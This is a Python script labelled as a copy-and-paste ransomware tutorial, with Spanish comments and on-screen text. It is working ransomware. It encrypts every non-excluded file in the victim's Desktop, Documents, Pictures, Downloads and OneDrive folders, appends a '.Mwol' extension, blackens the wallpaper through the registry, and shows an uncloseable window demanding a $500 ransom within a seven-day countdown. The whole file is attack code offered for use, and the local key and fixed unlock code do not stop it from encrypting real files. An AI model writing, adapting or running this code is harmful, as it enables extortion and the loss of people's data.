#Ransomware tutorial
# copiar y pegar

 import os
import json
import time
import sys
import subprocess
from datetime import datetime, timedelta
import tkinter as tk
from tkinter import messagebox
import ctypes
import winreg

# ─── Asegurar que cryptography esté instalado ───────────────────────────────
try:
    from cryptography.fernet import Fernet
except ImportError:
    try:
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", "cryptography", "-q"]
        )
        from cryptography.fernet import Fernet
    except Exception as e:
        messagebox.showerror(
            "Error",
            f"No se pudo instalar la libreria de cifrado:\n{e}\n\n"
            "Ejecuta: pip install cryptography"
        )
        sys.exit(1)

# ─── CONFIGURACION (edita para tu video) ────────────────────────────────────
PRECIO_RESCATE   = "$500 USD"           # ← precio del rescate
ALIAS_PAGADOR    = "CiberSecMaster"     # ← tu alias
GMAIL_CONTACTO   = "rescate@example.com"  # ← tu gmail
CODIGO_CORRECTO  = "12345"              # ← clave de desbloqueo
DIAS_TOTALES     = 7                    # ← dias para pagar
NUEVA_EXTENSION  = ".Mwol"              # ← extension que se añade al cifrar
# ─────────────────────────────────────────────────────────────────────────────

# Extensiones que NO se cifran (lista negra). Todo lo demas se cifra.
EXTENSIONES_EXCLUIDAS = {
    '.exe', '.bat', '.cmd', '.py', '.dll', '.sys', '.json', '.ini',
    '.lnk', '.ico', '.log', '.tmp', '.temp', '.msi', '.cab', '.drv',
    '.ocx', '.scr', '.fon', '.ttf', '.otf', '.ps1', '.vbs', '.js',
    '.css', '.html', '.htm', '.xml', '.cfg', '.conf', '.env',
    '.dat', '.db', '.sqlite', '.pid', '.lock'
}

USER_HOME        = os.path.expanduser("~")
ARCHIVO_CONFIG   = os.path.join(USER_HOME, ".lock_config_mwol.json")
ARCHIVO_REGISTRO = os.path.join(USER_HOME, "originales_mwol.json")


def obtener_carpetas_usuario():
    """Carpetas principales del usuario (EN/ES)."""
    candidatas = [
        os.path.join(USER_HOME, "Desktop"),
        os.path.join(USER_HOME, "Escritorio"),
        os.path.join(USER_HOME, "Documents"),
        os.path.join(USER_HOME, "Documentos"),
        os.path.join(USER_HOME, "Pictures"),
        os.path.join(USER_HOME, "Imagenes"),
        os.path.join(USER_HOME, "Videos"),
        os.path.join(USER_HOME, "Music"),
        os.path.join(USER_HOME, "Musica"),
        os.path.join(USER_HOME, "Downloads"),
        os.path.join(USER_HOME, "Descargas"),
        os.path.join(USER_HOME, "OneDrive"),
        os.path.join(USER_HOME, "OneDrive - Personal"),
    ]
    return [c for c in candidatas if os.path.isdir(c)]


def inicializar_tiempo():
    """Crea o lee el plazo de 7 dias."""
    try:
        if os.path.exists(ARCHIVO_CONFIG):
            with open(ARCHIVO_CONFIG, "r", encoding="utf-8") as f:
                return datetime.fromisoformat(json.load(f)["deadline"])
    except Exception:
        pass
    deadline = datetime.now() + timedelta(days=DIAS_TOTALES)
    try:
        with open(ARCHIVO_CONFIG, "w", encoding="utf-8") as f:
            json.dump({"deadline": deadline.isoformat()}, f)
    except Exception:
        pass
    return deadline


def obtener_o_crear_clave():
    """Devuelve la clave Fernet (la crea si no existe)."""
    try:
        if os.path.exists(ARCHIVO_CONFIG):
            with open(ARCHIVO_CONFIG, "r", encoding="utf-8") as f:
                data = json.load(f)
            if "clave" in data:
                return data["clave"].encode()
    except Exception:
        pass
    clave = Fernet.generate_key()
    try:
        with open(ARCHIVO_CONFIG, "r", encoding="utf-8") as f:
            data = json.load(f)
    except Exception:
        data = {}
    data["clave"] = clave.decode()
    with open(ARCHIVO_CONFIG, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)
    return clave


def poner_fondo_negro():
    """Fondo de pantalla negro."""
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            "Control Panel\\Colors", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Background", 0, winreg.REG_SZ, "0 0 0")
        winreg.CloseKey(key)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, "", 3)
    except Exception:
        pass


def cifrar_archivos():
    """Cifra el contenido de cada archivo y renombra añadiendo .Mwol."""
    fernet = Fernet(obtener_o_crear_clave())
    registros = {}
    errores = 0
    for carpeta in obtener_carpetas_usuario():
        for root, dirs, files in os.walk(carpeta, onerror=lambda e: None):
            for nombre in files:
                try:
                    if nombre.endswith(NUEVA_EXTENSION):
                        continue
                    ext = os.path.splitext(nombre)[1].lower()
                    if ext in EXTENSIONES_EXCLUIDAS:
                        continue
                    ruta = os.path.join(root, nombre)
                    if os.path.abspath(ruta) in (
                        os.path.abspath(ARCHIVO_CONFIG),
                        os.path.abspath(ARCHIVO_REGISTRO)):
                        continue
                    with open(ruta, "rb") as rf:
                        datos = rf.read()
                    cifrado = fernet.encrypt(datos)
                    with open(ruta, "wb") as wf:
                        wf.write(cifrado)
                    nueva_ruta = ruta + NUEVA_EXTENSION
                    if os.path.exists(nueva_ruta):
                        os.remove(nueva_ruta)
                    os.rename(ruta, nueva_ruta)
                    registros[nueva_ruta] = ruta
                except Exception:
                    errores += 1
    try:
        with open(ARCHIVO_REGISTRO, "w", encoding="utf-8") as fh:
            json.dump(registros, fh, ensure_ascii=False, indent=4)
    except Exception:
        pass
    return len(registros), errores


def descifrar_archivos():
    """Descifra contenido y restaura nombre original. No crashea."""
    fernet = Fernet(obtener_o_crear_clave())
    restaurados = 0
    errores = 0
    if not os.path.exists(ARCHIVO_REGISTRO):
        return 0, 0
    try:
        with open(ARCHIVO_REGISTRO, "r", encoding="utf-8") as fh:
            registros = json.load(fh)
    except Exception:
        return 0, 1
    for nueva_ruta, ruta_original in registros.items():
        try:
            if not os.path.exists(nueva_ruta):
                errores += 1
                continue
            with open(nueva_ruta, "rb") as rf:
                cifrado = rf.read()
            original = fernet.decrypt(cifrado)
            with open(nueva_ruta, "wb") as wf:
                wf.write(original)
            if os.path.exists(ruta_original):
                os.remove(ruta_original)
            os.rename(nueva_ruta, ruta_original)
            restaurados += 1
        except Exception:
            errores += 1
    for archivo in (ARCHIVO_REGISTRO, ARCHIVO_CONFIG):
        try:
            if os.path.exists(archivo):
                os.remove(archivo)
        except Exception:
            pass
    return restaurados, errores


class AppBloqueo:
    def __init__(self, root, deadline):
        self.root = root
        self.deadline = deadline
        self.root.title("DISPOSITIVO BLOQUEADO")
        self.root.geometry("640x500")
        self.root.config(bg="#0a0a0a")
        self.root.resizable(False, False)
        self.root.protocol("WM_DELETE_WINDOW", self._evitar_cierre)
        self.root.bind("<Return>", lambda e: self.verificar_codigo())

        self.root.update_idletasks()
        x = (self.root.winfo_screenwidth() - 640) // 2
        y = (self.root.winfo_screenheight() - 500) // 2
        self.root.geometry(f"+{x}+{y}")

        tk.Label(root, text="TUS ARCHIVOS HAN SIDO ENCRIPTADOS",
                 font=("Arial", 22, "bold"), fg="#ff2222",
                 bg="#0a0a0a", wraplength=580).pack(pady=(22, 10))

        frame_msg = tk.Frame(root, bg="#1a1a1a", bd=2, relief="groove")
        frame_msg.pack(padx=30, pady=5, fill="x")
        tk.Label(frame_msg,
                 text=(f"Si no pagas el rescate de {PRECIO_RESCATE} a "
                       f"{ALIAS_PAGADOR},\ntus archivos NO seran "
                       f"recuperables por ningun medio."),
                 font=("Arial", 12, "bold"), fg="#ffcc00",
                 bg="#1a1a1a", justify="center").pack(pady=10, padx=10)

        tk.Label(root,
                 text="Como saber si ya pague el rescate?",
                 font=("Arial", 11, "bold"), fg="#ffffff",
                 bg="#0a0a0a").pack(pady=(15, 0))
        tk.Label(root,
                 text=(f"Comunicate con {GMAIL_CONTACTO}\ny pasa el "
                       f"comprobante. Luego te daremos la clave\npara "
                       f"desbloquear el dispositivo."),
                 font=("Arial", 11), fg="#bbbbbb",
                 bg="#0a0a0a", justify="center").pack(pady=5)

        self.lbl_tiempo = tk.Label(root, text="",
                                   font=("Arial", 14, "bold"),
                                   fg="#ffffff", bg="#0a0a0a")
        self.lbl_tiempo.pack(pady=(12, 5))

        tk.Frame(root, height=2, bg="#333333").pack(fill="x", padx=50, pady=8)

        tk.Label(root, text="INGRESA LA CLAVE DE DESBLOQUEO:",
                 font=("Arial", 11, "bold"), fg="#cccccc",
                 bg="#0a0a0a").pack(pady=5)
        self.entry_codigo = tk.Entry(root, font=("Arial", 20), show="*",
                                     justify="center", width=20, bd=3,
                                     relief="sunken", bg="#222222",
                                     fg="#00ff00",
                                     insertbackground="#00ff00")
        self.entry_codigo.pack(pady=10)
        self.entry_codigo.focus_set()

        tk.Button(root, text="DESBLOQUEAR",
                  font=("Arial", 14, "bold"), bg="#28a745", fg="white",
                  padx=25, pady=10, command=self.verificar_codigo,
                  activebackground="#218838", activeforeground="white",
                  cursor="hand2", bd=0).pack(pady=10)

        self.actualizar_cuenta_regresiva()

    def _evitar_cierre(self):
        messagebox.showwarning("BLOQUEADO",
                               "No puedes cerrar la ventana hasta "
                               "ingresar el codigo correcto.")

    def actualizar_cuenta_regresiva(self):
        try:
            diff = self.deadline - datetime.now()
            if diff.total_seconds() <= 0:
                self.lbl_tiempo.config(
                    text="TIEMPO AGOTADO — Tus archivos se perderan "
                         "para siempre",
                    fg="#ff0000")
            else:
                s = int(diff.total_seconds())
                d, h, m, sec = s // 86400, (s % 86400) // 3600, \
                                 (s % 3600) // 60, s % 60
                self.lbl_tiempo.config(
                    text=f"Tiempo restante: {d}d {h:02d}h {m:02d}m "
                         f"{sec:02d}s",
                    fg="#ffffff")
                self.root.after(1000, self.actualizar_cuenta_regresiva)
        except Exception:
            pass

    def verificar_codigo(self):
        try:
            codigo = self.entry_codigo.get().strip()
            if codigo == CODIGO_CORRECTO:
                self.entry_codigo.config(state="disabled")
                self.lbl_tiempo.config(
                    text="Desencriptando archivos...", fg="#28a745")
                self.root.update()
                restaurados, errores = descifrar_archivos()
                if errores > 0 and restaurados == 0:
                    messagebox.showerror(
                        "Error",
                        f"No se pudieron desencriptar los archivos. "
                        f"Errores: {errores}")
                    self.entry_codigo.config(state="normal")
                else:
                    msg = (f"Codigo correcto!\n"
                           f"Archivos desencriptados: {restaurados}")
                    if errores:
                        msg += f"\nErrores: {errores}"
                    messagebox.showinfo("Exito", msg)
                    self.root.destroy()
            else:
                messagebox.showerror("Error",
                                     "Codigo incorrecto. "
                                     "Vuelve a intentarlo.")
                self.entry_codigo.delete(0, tk.END)
        except Exception as e:
            messagebox.showerror("Error inesperado",
                                 f"{e}\n\nIntenta ejecutar de nuevo.")
            self.entry_codigo.config(state="normal")
            self.entry_codigo.delete(0, tk.END)


if __name__ == "__main__":
    try:
        deadline = inicializar_tiempo()
        if not os.path.exists(ARCHIVO_REGISTRO):
            poner_fondo_negro()
            cifrar_archivos()
            time.sleep(0.5)
        root = tk.Tk()
        app = AppBloqueo(root, deadline)
        root.mainloop()
    except Exception as e:
        try:
            r = tk.Tk()
            r.withdraw()
            messagebox.showerror("Error Critico",
                                 f"Ocurrio un error:\n{e}")
        except Exception:
            pass
